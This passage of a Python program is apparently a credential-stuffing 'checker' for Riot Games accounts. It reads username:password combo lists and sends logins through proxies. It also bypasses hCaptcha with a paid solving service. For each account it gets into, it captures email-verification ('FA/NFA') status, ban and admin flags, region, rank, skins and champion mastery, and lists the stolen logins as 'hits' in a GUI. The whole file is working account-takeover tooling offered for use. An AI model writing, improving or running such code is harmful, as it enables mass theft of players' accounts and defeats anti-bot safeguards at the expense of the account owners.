            error_details = f"Auth_Post_Exception - Details: {msg}"
            add_log(f"Authorization request error: {error_details}")
            login_failed_with_errors = True
            continue

        # --- Login POST (Step 3) to get rqdata ---
        login_post_url = "https://authenticate.riotgames.com/api/v1/login"
        # CLEANED PAYLOAD FROM REFERENCE
        login_post_payload = {
            "clientId": "riot-client",
            "type": "auth",
            "language": "en_GB", # Reference uses en_GB
            "platform": "windows",
            "remember": False,
            "riot_identity": {
                "username": None,
                "password": None,
                "captcha": None,
                "state": "auth"
            }
        }
        
        try:
            add_log(f"DEBUG: Login POST Request to {login_post_url}")
            add_log(f"DEBUG: Login POST Payload: {json.dumps(login_post_payload)}")
            login_post_response = session.post(login_post_url, json=login_post_payload, timeout_seconds=10, proxy=proxy_url)
            add_log(f"DEBUG: Login POST Status: {login_post_response.status_code}")
            login_post_data = login_post_response.json()
            
            # [NEW] Check for captcha_not_allowed error and retry
            if login_post_data.get("error") == "captcha_not_allowed":
                add_log(f"Login POST returned 'captcha_not_allowed'. Retrying... (Attempt {attempt+1})")
                login_failed_with_errors = True
                time.sleep(1.5) # Slight delay before retry
                continue

            # Extract rqdata - ROBUST CHECK FROM REFERENCE
            captcha_data = login_post_data.get("captcha", {}).get("hcaptcha", {})
            rqdata = captcha_data.get("data")
            
            if not rqdata:
                # Check alternate location
                rqdata = captcha_data.get("rqdata")
            
            if not rqdata:
                error_details = "Login_Post_No_Rqdata - Response: " + json.dumps(login_post_data)
                add_log("No CAPTCHA data received (Captcha might not be required or blocked)")
                login_failed_with_errors = True
                continue
        except Exception as e:
            msg = str(e)
            if "unexpected EOF" in msg:
                add_log(f"Network error (Unexpected EOF in Login POST). Retrying... (Attempt {attempt+1})")
                time.sleep(1.5)
                login_failed_with_errors = True
                continue
            error_details = f"Login_Post_Exception - Details: {msg}"
            add_log(f"CAPTCHA fetch error (Login POST): {error_details}")
            login_failed_with_errors = True
            continue

        # --- Solve CAPTCHA (Step 4) ---
        # Passing proxy_url (http://user:pass@ip:port) which will be formatted inside.
        hcaptcha_token = solve_riot_captcha(proxy_url, proxies_config, rqdata)

        if not hcaptcha_token:
            add_log("CAPTCHA solve failed or balance too low.")
            if stop_event.is_set():
                return
            login_failed_with_errors = True
            continue

        # --- Login PUT (Step 5) ---
        login_put_url = "https://authenticate.riotgames.com/api/v1/login"
        # CLEANED PUT PAYLOAD FROM REFERENCE
        login_put_payload = {
            "type": "auth",
            "remember": False,
            "riot_identity": {
                "username": username,
                "password": password,
                "captcha": f"hcaptcha {hcaptcha_token}", # CORRECT FORMAT: "hcaptcha " + token
                "state": None
            }
        }

        try:
            add_log(f"DEBUG: Login PUT Request to {login_put_url}")
            # Do not log password in production
            debug_payload = login_put_payload.copy()
            debug_payload["riot_identity"] = debug_payload["riot_identity"].copy()
            debug_payload["riot_identity"]["password"] = "***"
            add_log(f"DEBUG: Login PUT Payload: {json.dumps(debug_payload)}")
            
            login_put_response = session.put(login_put_url, json=login_put_payload, timeout_seconds=10, proxy=proxy_url)
            add_log(f"DEBUG: Login PUT Status: {login_put_response.status_code}")
            # add_log(f"DEBUG: Login PUT Response: {login_put_response.text}") # Uncomment to see full response
            login_put_data = login_put_response.json()
        except Exception as e:
            msg = str(e)
            if "unexpected EOF" in msg:
                add_log(f"Network error (Unexpected EOF in Login PUT). Retrying... (Attempt {attempt+1})")
                time.sleep(1.5)
                login_failed_with_errors = True
                continue
            error_details = f"Login_Put_Exception - Details: {msg}"
            add_log(f"Login attempt error (Login PUT): {error_details}")
            login_failed_with_errors = True
            continue

        # Check for "invalid_request" (Retry if possible)
        if login_put_data.get("error") == "invalid_request":
            add_log("Login failed with 'invalid_request'. Retrying...")
            with stats_lock:
                global_stats['invalid_requests'] += 1
            login_failed_with_errors = True
            time.sleep(1.5)
            continue

        # If it gets here, the login attempt was successful or failed with an error that is not network/captcha related.
        login_failed_with_errors = False
        break
    # --- End of Login/Captcha Retry Loop ---

    # --- Final Handling After Retries ---

    if login_failed_with_errors:
        # If it failed after MAX_LOGIN_RETRIES, log the last error and finish the check.
        save_error_log(combo, "Login_Captcha_Persistent_Error", error_details)
        with stats_lock:
            global_stats['errors'] += 1
            global_stats['checked'] += 1
        return

    # If it got here, the login was successful or failed for a final reason (Bad Combo, 2FA, etc.)
    with stats_lock:
        global_stats['checked'] += 1

    if login_put_data.get("type") == "success":
        # --- SUCCESS LOGIN HANDLING ---
        
        login_token = login_put_data.get("success", {}).get("login_token")
        puuid = login_put_data.get("success", {}).get("puuid")

        try:
             # Post login-token
            lt_payload = {"authentication_type": "RiotAuth", "code_verifier": "", "login_token": login_token, "persist_login": False}
            lt_response = session.post("https://auth.riotgames.com/api/v1/login-token", json=lt_payload, timeout_seconds=10, proxy=proxy_url)

            # Final authorization to get URI with tokens
            auth2_payload = {"acr_values": "", "claims": "", "client_id": "riot-client", "code_challenge": "", "code_challenge_method": "", "login_token": None, "nonce": uuid.uuid4().hex, "redirect_uri": "http://localhost/redirect", "response_type": "token id_token", "riot_patchline": None, "scope": "openid link ban lol_region account"}
            auth2_response = session.post("https://auth.riotgames.com/api/v1/authorization", json=auth2_payload, timeout_seconds=10, proxy=proxy_url)
            
            uri_string = auth2_response.json().get("response", {}).get("parameters", {}).get("uri")
            if not uri_string: raise ValueError("URI not found in final auth response")

            # Extract access_token and id_token
            access_token_match = re.search(r"access_token=([^&]+)", uri_string)
            if not access_token_match: raise ValueError("Could not extract access_token")
            access_token = access_token_match.group(1)

            # ---------------------------------------------------------
            # SPLIT LOGIC BASED ON CHECK_MODE
            # ---------------------------------------------------------
            
            if CHECK_MODE == 2:
                # --- LEAGUE OF LEGENDS LOGIC ---
                userinfo_response = session.get("https://auth.riotgames.com/userinfo", headers={"Authorization": f"Bearer {access_token}"}, timeout_seconds=10, proxy=proxy_url)
                user_data = userinfo_response.json()
                add_log(f"LoL UserInfo: {json.dumps(user_data)}")

                # 0. Check if account HAS LoL profile
                # Logic: Must have game_name AND tag_line
                acct_data = user_data.get("acct", {})
                game_name = acct_data.get("game_name")
                tag_line = acct_data.get("tag_line")

                if not game_name or not tag_line:
                    add_log("Account has no active LoL profile (missing game_name/tag_line). Marking as invalid/fails.")
                    with stats_lock:
                        global_stats['fails'] += 1
                    return

                # Get Summoner Level from "lol_account" if available
                lol_account = user_data.get("lol_account")
                summoner_level = 0
                if lol_account and isinstance(lol_account, dict):
                    summoner_level = lol_account.get("summoner_level", 0)

                # 1. FA Status
                email_verified = user_data.get("email_verified", False)
                fa_status = not email_verified
                
                # 2. Admin Status
                is_admin = acct_data.get("adm", False)
                
                # 3. Ban Status
                ban_data = user_data.get("ban", {})
                restrictions = ban_data.get("restrictions", [])
                is_banned = len(restrictions) > 0
                is_perma = False
                
                # Look for Game Location inside ban restrictions
                ban_game_location = None
                for r in restrictions:
                    if r.get("type") == "PERMANENT_BAN":
                        is_perma = True
                    # Extract region from ban data if available
                    dat = r.get("dat", {})
                    if isinstance(dat, dict):
                         gl = dat.get("gameLocation")
                         if gl: ban_game_location = gl

                # 4. Region Detection Priority
                # Priority 1: Check active lol_region list
                region_raw = None
                lol_regions = user_data.get("lol_region", [])
                if lol_regions:
                    # Find first active region
                    for lr in lol_regions:
                        if lr.get("active"):
                            region_raw = lr.get("pid") # or cpid
                            break
                
                # Priority 2: 'lol' object
                if not region_raw:
                    lol_obj = user_data.get("lol", {})
                    region_raw = lol_obj.get("cpid") or lol_obj.get("pid")

                # Priority 3: original_platform_id
                if not region_raw:
                    region_raw = user_data.get("original_platform_id")

                # Priority 4: region.id (fallback)
                if not region_raw:
                    region_raw = user_data.get("region", {}).get("id")

                # Priority 5: gameLocation from ban data
                if not region_raw and ban_game_location:
                    region_raw = ban_game_location
                
                if not region_raw:
                    region_raw = "UNKNOWN"
                
                # --- [NEW] Riot API Integration for Full Capture ---
                summoner_level_api = 0
                champion_count = 0
                champion_mastery_list = [] # Initialize to prevent UnboundLocalError

                # Get continental route for PUUID lookup
                regional_route = RIOT_REGION_MAPPING.get(region_raw.upper())
                if not regional_route:
                    add_log(f"Could not find continental route for region '{region_raw}'. Defaulting to americas.")
                    regional_route = "americas"

                try:
                    # 1. Get PUUID
                    riot_rate_limiter.acquire()
                    puuid_url = f"https://{regional_route}.api.riotgames.com/riot/account/v1/accounts/by-riot-id/{game_name}/{tag_line}"
                    puuid_headers = {"X-Riot-Token": RIOT_API_KEY}
                    puuid_response = session.get(puuid_url, headers=puuid_headers, timeout_seconds=10, proxy=proxy_url)

                    if puuid_response.status_code == 200:
                        puuid_data = puuid_response.json()
                        puuid = puuid_data.get("puuid")

                        if puuid:
                            # 2. Get Summoner Level
                            riot_rate_limiter.acquire()
                            summoner_url = f"https://{region_raw}.api.riotgames.com/lol/summoner/v4/summoners/by-puuid/{puuid}"
                            summoner_response = session.get(summoner_url, headers=puuid_headers, timeout_seconds=10, proxy=proxy_url)
                            if summoner_response.status_code == 200:
                                summoner_level_api = summoner_response.json().get("summonerLevel", 0)
                            else:
                                add_log(f"Failed to get summoner level: {summoner_response.status_code} {summoner_response.text}")

                            # 3. Get Champion Mastery (to count champions)
                            riot_rate_limiter.acquire()
                            mastery_url = f"https://{region_raw}.api.riotgames.com/lol/champion-mastery/v4/champion-masteries/by-puuid/{puuid}"
                            mastery_response = session.get(mastery_url, headers=puuid_headers, timeout_seconds=10, proxy=proxy_url)
                            if mastery_response.status_code == 200:
                                champion_mastery_list = mastery_response.json()
                                champion_count = len(champion_mastery_list)
                            else:
                                add_log(f"Failed to get champion mastery: {mastery_response.status_code} {mastery_response.text}")
                        else:
                            add_log("PUUID not found in Riot API response.")
                    else:
                        add_log(f"Failed to get PUUID: {puuid_response.status_code} {puuid_response.text}")

                except Exception as e:
                    add_log(f"Exception during Riot API calls: {e}")
                # --- End of Riot API Integration ---

                # [MODIFIED] Call save_lol_info directly from here
                save_lol_info(
                    username=username,
                    password=password,
                    region=region_raw,
                    fa=fa_status,
                    is_admin=is_admin,
                    is_banned=is_banned,
                    is_perma=is_perma,
                    level=summoner_level_api,
                    champion_count=champion_count,
                    champion_mastery=champion_mastery_list
                )
                
                with stats_lock:
                    global_stats['hits'] += 1
                    if fa_status: global_stats['fa'] += 1
                    else: global_stats['nfa'] += 1
                    
                    if is_banned: global_stats['banned'] += 1
                    if is_perma: global_stats['permabanned'] += 1
                    
                    # Simple Region Stats for UI
                    reg_key = region_raw.upper()
                    if reg_key in region_counts:
                        region_counts[reg_key]["FA" if fa_status else "NFA"] += 1
                    else:
                        region_counts["UNKNOWN"]["FA" if fa_status else "NFA"] += 1

                return # End of LoL Logic

            else:
                # --- VALORANT LOGIC (Original) ---
                
                # [MODIFIED & CORRECTED] Get real region and determine the correct shard for API calls
                id_token_match = re.search(r"id_token=([^&]+)", uri_string)
                if not id_token_match: raise ValueError("Could not extract id_token for Geo")
                id_token = id_token_match.group(1)

                geo_payload = {"id_token": id_token}
                geo_response = session.put("https://riot-geo.pas.si.riotgames.com/pas/v1/product/valorant", headers={"Authorization": f"Bearer {access_token}"}, json=geo_payload, timeout_seconds=10, proxy=proxy_url)
                affinities = geo_response.json().get("affinities", {})
                account_region = affinities.get("live", "UNKNOWN")

                # Shard Correction
                shard_region_lower = account_region.lower()
                if shard_region_lower in ["latam", "br"]: shard = "na"
                elif shard_region_lower == "unknown": shard = "na"
                else: shard = shard_region_lower

                # Determine FA/NFA
                userinfo_response = session.get("https://auth.riotgames.com/userinfo", headers={"Authorization": f"Bearer {access_token}"}, timeout_seconds=10, proxy=proxy_url)
                email_verified = userinfo_response.json().get("email_verified", True)
                account_type = "FA" if not email_verified else "NFA"

                # Get Entitlements Token
                ent_response = session.post("https://entitlements.auth.riotgames.com/api/token/v1", headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'}, json={}, timeout_seconds=10, proxy=proxy_url)
                ent_token = ent_response.json().get('entitlements_token')
                if not ent_token: raise ValueError("Failed to get entitlements token")

                # Get Account Level
                xp_url = f"https://pd.{shard}.a.pvp.net/account-xp/v1/players/{puuid}"
                api_headers = {'X-Riot-Entitlements-JWT': ent_token, 'Authorization': f'Bearer {access_token}', 'X-Riot-ClientVersion': CLIENT_VERSION, 'X-Riot-ClientPlatform': CLIENT_PLATFORM_B64}
                xp_response = session.get(xp_url, headers=api_headers, timeout_seconds=15, proxy=proxy_url)
                account_level = xp_response.json().get("Progress", {}).get("Level", 0)

                # Get Skins
                skins_url = f"https://pd.{shard}.a.pvp.net/store/v1/entitlements/{puuid}/{SKINS_ITEM_TYPE_ID}"
                skins_response = session.get(skins_url, headers=api_headers, timeout_seconds=15, proxy=proxy_url)
                
                skin_count = 0
                entitlements = skins_response.json().get("Entitlements", [])
                if entitlements:
                    owned_parent_skins = set()
                    for item in entitlements:
                        item_id = item.get('ItemID')
                        if item_id in SKIN_ID_TO_PARENT_UUID_MAP:
                            parent_uuid = SKIN_ID_TO_PARENT_UUID_MAP[item_id]
                            owned_parent_skins.add(parent_uuid)
                    skin_count = len(owned_parent_skins)

                # Update Stats
                with stats_lock:
                    global_stats['hits'] += 1
                    global_stats[account_type.lower()] += 1

                # Get Rank (HenrikDev)
                rank_name = get_henrikdev_mmr_info(puuid, account_region, USER_AGENT, proxy_url)
                if rank_name is None or "RATE_LIMIT_HIT" in rank_name or "EXCEPTION" in rank_name:
                    add_log("Failed to get Rank. Saving to NOCAPTURE.")
                    save_nocapture_info(combo)
                    return

                # Update Rank/Region/Skin Stats
                with stats_lock:
                    rank_key = rank_name.split(' ')[0] if rank_name != "No rank" else "No rank"
                    if rank_key in rank_counts: rank_counts[rank_key][account_type] += 1
                    
                    region_key = account_region.upper()
                    if region_key in region_counts:
                        region_counts[region_key][account_type] += 1
                    else: 
                        region_prefix = ''.join(filter(str.isalpha, region_key))
                        if region_prefix in region_counts: region_counts[region_prefix][account_type] += 1
                        else: region_counts["UNKNOWN"][account_type] += 1

                    skin_range = get_skin_range(skin_count)
                    if skin_range: skin_counts[skin_range][account_type] += 1

                save_account_info(username, password, account_region, account_level, rank_name, account_type, skin_count)
                add_log(f"Account Saved! Type: {account_type}, Region: {account_region}, Rank: {rank_name}, Skins: {skin_count}")

        except Exception as e:
            error_details = f"Post_Login_Flow_Exception - Details: {str(e)}"
            add_log(f"Error during Post-Login Flow: {error_details}")
            save_error_log(combo, "Post_Login_Flow_Failed", error_details)
            with stats_lock: global_stats['errors'] += 1
            return

    elif login_put_data.get("type") == "multifactor":
        add_log("2FA Response: " + json.dumps(login_put_data))
        with stats_lock:
            global_stats['2fa'] += 1
            global_stats['fails'] += 1
        add_log("Login Failed (2FA Required).")
    else:
        if login_put_data:
            add_log("Fail Response: " + json.dumps(login_put_data))
            with stats_lock:
                global_stats['fails'] += 1
            add_log("Login Failed (Bad Combo/Other Error).")

# --- Worker Function ---
def worker(combo_queue):
    while not combo_queue.empty() and not stop_event.is_set():
        try:
            combo_line_with_retries = combo_queue.get_nowait()
            check_account(combo_line_with_retries, combo_queue)
            combo_queue.task_done()
        except queue.Empty:
            return
        except Exception as e:
            error_details = str(e)
            add_log(f"CRITICAL ERROR in worker: {error_details}")
            save_error_log(f"Worker_Crash: {threading.current_thread().name}", "Worker_Critical_Exception", error_details)
            with stats_lock:
                global_stats['errors'] += 1

# --- [NEW] Tkinter UI Class for LoL ---
DDRAGON_VERSION = "15.24.1" # As requested by user

class LoLChampionViewer:
    def __init__(self, hits_queue, champion_data):
        self.hits_queue = hits_queue
        self.champion_data = champion_data
        self.champion_id_to_name_map = self._create_id_to_name_map(champion_data)
        self.root = None
        self.hits_listbox = None
        self.champion_canvas = None
        self.champion_frame = None
        self.hits_data = {} # Maps listbox entry to full data
        self.image_cache = {} # Cache for tkinter photo images

    def _create_id_to_name_map(self, raw_data):
        """Creates a simple dict for fast ID to name lookups."""
        if not raw_data: return {}
        return {info['key']: info['id'] for info in raw_data.values()}

    def setup_ui(self):
        self.root = tk.Tk()
        self.root.title("LoL Account Viewer")
        self.root.geometry("1000x700")

        # Style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TFrame", background="#f0f0f0")
        style.configure("TLabel", background="#f0f0f0", font=('Helvetica', 10))
        style.configure("TListbox", font=('Helvetica', 10))

        # Main Frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Left side: Hits List
        hits_frame = ttk.Frame(main_frame)
        hits_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))

        ttk.Label(hits_frame, text="Successful Hits", font=('Helvetica', 12, 'bold')).pack(anchor=tk.W)

        list_frame = ttk.Frame(hits_frame)
        list_frame.pack(fill=tk.Y, expand=True)

        self.hits_listbox = tk.Listbox(list_frame, width=40, height=35)
        self.hits_listbox.pack(side=tk.LEFT, fill=tk.Y, expand=True)

        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.hits_listbox.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.hits_listbox.config(yscrollcommand=scrollbar.set)

        self.hits_listbox.bind('<<ListboxSelect>>', self.on_hit_select)

        # Right side: Champion Display
        champion_display_frame = ttk.Frame(main_frame)
        champion_display_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        ttk.Label(champion_display_frame, text="Champion Mastery", font=('Helvetica', 12, 'bold')).pack(anchor=tk.W)

        # Canvas with scrollbar for champion details
        self.champion_canvas = tk.Canvas(champion_display_frame, borderwidth=0, background="#ffffff")
        self.champion_frame = ttk.Frame(self.champion_canvas, style="TFrame")

        vsb = ttk.Scrollbar(champion_display_frame, orient="vertical", command=self.champion_canvas.yview)
        self.champion_canvas.configure(yscrollcommand=vsb.set)

        vsb.pack(side="right", fill="y")
        self.champion_canvas.pack(side="left", fill="both", expand=True)
        self.canvas_window = self.champion_canvas.create_window((4, 4), window=self.champion_frame, anchor="nw")

        self.champion_frame.bind("<Configure>", self.on_frame_configure)
        self.champion_canvas.bind("<Configure>", self.on_canvas_configure)

    def on_frame_configure(self, event):
        self.champion_canvas.configure(scrollregion=self.champion_canvas.bbox("all"))

    def on_canvas_configure(self, event):
        self.champion_canvas.itemconfig(self.canvas_window, width=event.width - 4)

    def process_queue(self):
        try:
            while not self.hits_queue.empty():
                hit = self.hits_queue.get_nowait()
                # user:pass | Level: X | Champs: Y
                display_text = f"{hit['username']}:{hit['password']} | Lvl: {hit['level']} | Champs: {hit['champion_count']}"
                self.hits_listbox.insert(tk.END, display_text)
                self.hits_data[display_text] = hit
        except queue.Empty:
            pass
        finally:
            if self.root:
                self.root.after(1000, self.process_queue) # Check queue every second

    def get_champion_name_by_id(self, champ_id):
        """[OPTIMIZED] Gets champion name from the pre-computed map."""
        return self.champion_id_to_name_map.get(str(champ_id), "Unknown")

    def display_champions(self, champion_mastery_list):
        # Clear previous champions
        for widget in self.champion_frame.winfo_children():
            widget.destroy()

        # Sort by mastery points
        sorted_list = sorted(champion_mastery_list, key=lambda x: x.get('championPoints', 0), reverse=True)

        for i, mastery_info in enumerate(sorted_list):
            champ_id = mastery_info.get('championId')
            champ_level = mastery_info.get('championLevel')
            champ_name = self.get_champion_name_by_id(champ_id)

            # Create a frame for each champion
            champ_entry_frame = ttk.Frame(self.champion_frame, padding=5, relief="groove", borderwidth=1)
            champ_entry_frame.pack(fill=tk.X, pady=5, padx=5)

            # Image
            image_url = f"https://ddragon.leagueoflegends.com/cdn/{DDRAGON_VERSION}/img/champion/{champ_name}.png"

            # Use a placeholder label that will be updated with the image
            image_label = ttk.Label(champ_entry_frame, text="Loading...")
            image_label.pack(side=tk.LEFT, padx=5)

            # Text info
            info_frame = ttk.Frame(champ_entry_frame)
            info_frame.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=5)

            ttk.Label(info_frame, text=champ_name, font=('Helvetica', 11, 'bold')).pack(anchor=tk.W)
            ttk.Label(info_frame, text=f"Mastery Level: {champ_level}", font=('Helvetica', 9)).pack(anchor=tk.W)

            # Download image in a separate thread to not freeze UI
            threading.Thread(target=self.load_image, args=(image_url, image_label), daemon=True).start()

    def load_image(self, url, label):
        try:
            if url in self.image_cache:
                label.config(image=self.image_cache[url])
                return

            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                img_data = Image.open(io.BytesIO(response.content))
                img_data.thumbnail((64, 64))
                photo_img = ImageTk.PhotoImage(img_data)

                self.image_cache[url] = photo_img
                label.config(image=photo_img)
                label.image = photo_img # Keep a reference
            else:
                label.config(text="No Img")
        except Exception as e:
            label.config(text="Error")
            add_log(f"Failed to load image {url}: {e}")

    def on_hit_select(self, event):
        selection_indices = self.hits_listbox.curselection()
        if not selection_indices:
            return

        selected_text = self.hits_listbox.get(selection_indices[0])
        hit_data = self.hits_data.get(selected_text)

        if hit_data and 'champion_mastery' in hit_data:
            self.display_champions(hit_data['champion_mastery'])

    def run(self):
        if not TKINTER_AVAILABLE:
            console.print("[bold red]Cannot start LoL UI: tkinter or Pillow is not installed.[/]")
            return

        self.setup_ui()
        self.root.after(1000, self.process_queue)
        self.root.mainloop()


# --- [NEW] UI Monitor Thread Function using Rich.Live ---
def ui_monitor(stop_e):
    if debug_mode:
        return # Do not render live UI in debug mode

    with Live(generate_layout(), screen=True, redirect_stderr=False, vertical_overflow="visible") as live:
        while not stop_e.is_set():
            live.update(generate_layout())
            time.sleep(0.5) # Refresh rate of the UI

# --- [NEW] Function to load and process skin data ---
def load_valorant_api_skins(console: Console):
    """
    Fetches all skin data from valorant-api.com and creates a map
    from every variant/level UUID to its parent skin's UUID. This
    is essential for accurate skin counting.
    """
    global SKIN_ID_TO_PARENT_UUID_MAP
    api_url = "https://valorant-api.com/v1/weapons/skins"
    console.print("[yellow]Loading all Valorant skin data for accurate counting. Please wait...[/]")
    
    try:
        response = requests.get(api_url, timeout=20)
        response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
        all_skins_data = response.json().get("data", [])

        for skin in all_skins_data:
            parent_uuid = skin.get("uuid")
            if not parent_uuid:
                continue

            # Map all levels of the skin to the parent UUID
            for level in skin.get("levels", []):
                level_uuid = level.get("uuid")
                if level_uuid:
                    SKIN_ID_TO_PARENT_UUID_MAP[level_uuid] = parent_uuid
            
            # Map all chromas (variants) of the skin to the parent UUID
            for chroma in skin.get("chromas", []):
                chroma_uuid = chroma.get("uuid")
                if chroma_uuid:
                    SKIN_ID_TO_PARENT_UUID_MAP[chroma_uuid] = parent_uuid
        
        console.print(f"[green]Successfully loaded and processed {len(SKIN_ID_TO_PARENT_UUID_MAP)} skin variants. Starting checker...[/]")
        time.sleep(2)

    except requests.exceptions.RequestException as e:
        console.print(f"[bold red]FATAL ERROR:[/bold red] Could not fetch skin data from valorant-api.com: {e}")
        console.print("[bold red]The checker cannot run without this data. Please check your internet connection and try again.[/]")
        sys.exit(1)

# --- [NEW] Function to load champion data for LoL UI ---
def load_champion_data(console: Console) -> Dict:
    """
    Fetches champion data from Riot's Data Dragon.
    This is needed to map champion IDs to names for the UI.
    """
    url = f"https://ddragon.leagueoflegends.com/cdn/{DDRAGON_VERSION}/data/en_US/champion.json"
    console.print("[yellow]Loading LoL champion data for UI. Please wait...[/]")
    try:
        response = requests.get(url, timeout=20)
        response.raise_for_status()
        data = response.json().get("data", {})
        console.print(f"[green]Successfully loaded data for {len(data)} champions.[/]")
        return data
    except requests.exceptions.RequestException as e:
        console.print(f"[bold red]FATAL ERROR:[/bold red] Could not fetch champion data: {e}")
        console.print("[bold red]The UI viewer may not work correctly.[/]")
        return {}


if __name__ == "__main__":
    console = Console()
    
    if not proxies:
        console.print("[bold yellow]Warning:[/bold yellow] The file 'proxies.txt' was not found. Requests will not use a proxy.")

    if os.path.exists("log.txt"):
        try:
            os.remove("log.txt")
        except Exception as e:
            console.print(f"[yellow]Could not clear previous log file: {e}[/]")

    # Fetch initial balance with fallback/warning
    if SECRETSOLVER_API_KEY:
        get_initial_balance(console)
    else:
        console.print("[bold red]WARNING: SECRETSOLVER_API_KEY is not set. Captchas will fail.[/]")
    
    # --- MENU SELECTION ---
    console.print(Panel.fit("[bold cyan]1[/] [bold]VALORANT NFA/FA FULL CAPTURE[/]\n[bold cyan]2[/] [bold]LOL NFA/FA CAPTURE: ADM AND BAN[/]", title="Select Mode"))
    while True:
        try:
            choice = console.input("[bold yellow]Select Option (1-2): [/]")
            if choice == '1':
                CHECK_MODE = 1
                break
            elif choice == '2':
                CHECK_MODE = 2
                break
            else:
                console.print("[red]Invalid selection.[/]")
        except KeyboardInterrupt:
            sys.exit()

    # --- [MODIFIED] Mode-specific setup ---
    lol_hits_queue = None
    champion_data = {}

    if CHECK_MODE == 1:
        # Load Skins Data only for Valorant Mode
        load_valorant_api_skins(console)
    else: # CHECK_MODE == 2
        console.print("[yellow]LoL Mode Selected.[/]")
        champion_data = load_champion_data(console)
        lol_hits_queue = queue.Queue() # Initialize queue for the UI

    debug_mode = '--debug' in sys.argv

    try:
        num_threads = int(console.input("[bold cyan]Enter number of threads: [/]"))
    except (ValueError, KeyboardInterrupt):
        console.print("[bold red]Invalid input. Exiting.[/]")
        sys.exit(1)

    if os.name == 'nt':
        os.system("mode con: cols=150 lines=45")

    file_path = 'combos.txt'
    if not os.path.exists(file_path):
        console.print("[bold red]ERROR:[/bold red] 'combos.txt' not found. Please create it and restart.")
        sys.exit(1)
    with open(file_path, 'r', encoding='utf-8') as f:
        combos = [line.strip() for line in f if line.strip() and len(line.split(':')) >= 2]
    global_stats['total'] = len(combos)

    combo_queue = queue.Queue()
    for combo in combos:
        combo_queue.put(f"{combo} | 0")

    start_time_for_cpm = time.time()
    last_cpm_check = start_time_for_cpm
    last_checked = 0

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(combo_queue,), name=f"Worker-{i}")
        t.daemon = True
        t.start()
        threads.append(t)

    # --- [MODIFIED] Start UI threads ---
    # Console UI runs for both modes
    ui_thread = threading.Thread(target=ui_monitor, args=(stop_event,), name="UI-Monitor")
    ui_thread.daemon = True
    ui_thread.start()

    # Tkinter UI only runs for LoL mode
    if CHECK_MODE == 2 and not debug_mode:
        viewer = LoLChampionViewer(lol_hits_queue, champion_data)
        tkinter_thread = threading.Thread(target=viewer.run, name="Tkinter-UI", daemon=True)
        tkinter_thread.start()

    try:
        combo_queue.join()
    except (KeyboardInterrupt, SystemExit):
        console.print("\n[bold yellow]Keyboard Interrupt detected. Stopping threads...[/]")
    finally:
        stop_event.set()

    for t in threads:
        t.join(timeout=2.0)
    ui_thread.join(timeout=2.0)

    # --- [MODIFIED] Final UI Rendering Logic ---
    if debug_mode:
        # Keep logs visible, don't clear screen
        console.print("\n[bold green]Finished checking all accounts (Debug Mode). Press ENTER to exit.[/]")
    else:
        # Standard UI mode - clear screen and show summary
        console.clear()
        final_layout = generate_layout()
        console.print(final_layout)
        console.print("\n[bold green]Finished checking all accounts. Press ENTER to exit.[/]")
    
    input()